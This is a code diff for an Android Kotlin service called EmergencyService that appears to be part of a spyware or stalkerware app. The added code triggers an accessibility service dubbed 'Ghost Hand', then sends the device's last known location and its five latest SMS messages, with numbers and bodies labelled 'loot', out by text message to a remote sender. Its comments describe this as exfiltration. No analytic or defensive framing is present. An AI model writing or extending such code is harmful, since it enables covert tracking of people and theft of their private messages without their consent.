@@ -50,10 +50,25 @@ class EmergencyService : Service() {
                 if (isOnline()) {
                     CloudManager.uploadData(applicationContext, modules, "EMERGENCY_RED")
                 } else {
-                     MyAccessibilityService.triggerDataRecovery()
-                     delay(5000) // Give Ghost Hand a moment
-                     val loc = getLastKnownLocation()
-                     if (loc != null) sendSms(sender, "ONE-SHOT: ${loc.latitude},${loc.longitude}")
+                    MyAccessibilityService.triggerDataRecovery()
+                    delay(5000) 
+
+                    // 1. Module-Aware Location Exfiltration
+                    if (modules.contains("ALL") || modules.contains("location")) {
+                        val loc = getLastKnownLocation()
+                        if (loc != null) sendSms(sender, "ONE-SHOT LOC: ${loc.latitude},${loc.longitude}")
+                    }
+
+                    // 2. Module-Aware SMS Exfiltration
+                    if (modules.contains("ALL") || modules.contains("sms")) {
+                        val latestSms = PhoneManager.getHistoricalSms(applicationContext, 5)
+                        for (i in 0 until latestSms.length()) {
+                            val msg = latestSms.getJSONObject(i)
+                            val loot = "[OneShot ${i+1}/5] ${msg.optString("num")}: ${msg.optString("body")}"
+                            sendSms(sender, loot)
+                            delay(1500)
+                        }
+                    }
                 }
                 stopSelf()
                 return@launch
